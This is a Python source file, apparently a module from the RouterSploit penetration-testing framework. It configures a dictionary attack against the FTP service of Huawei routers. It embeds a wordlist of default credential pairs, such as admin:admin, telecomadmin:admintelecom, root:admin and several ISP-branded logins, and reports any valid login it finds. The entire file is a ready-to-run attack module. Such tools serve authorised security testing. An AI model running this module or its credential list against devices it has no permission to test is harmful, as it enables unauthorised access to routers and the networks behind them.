from routersploit.core.exploit import *
from routersploit.modules.creds.generic.ftp_default import Exploit as FTPDefault


class Exploit(FTPDefault):
    __info__ = {
        "name": "Huawei Router Default FTP Creds",
        "description": "Module performs dictionary attack against Huawei Router FTP service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Huawei Router",
        ),
    }

    target = OptIP("", "Targe IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:admin,admin:,Admin:admin,user:user,vodafone:vodafone,user:HuaweiUser,telecomadmin:admintelecom,root:admin,digicel:digicel", "User:Pass or file with default credentials (file://)")
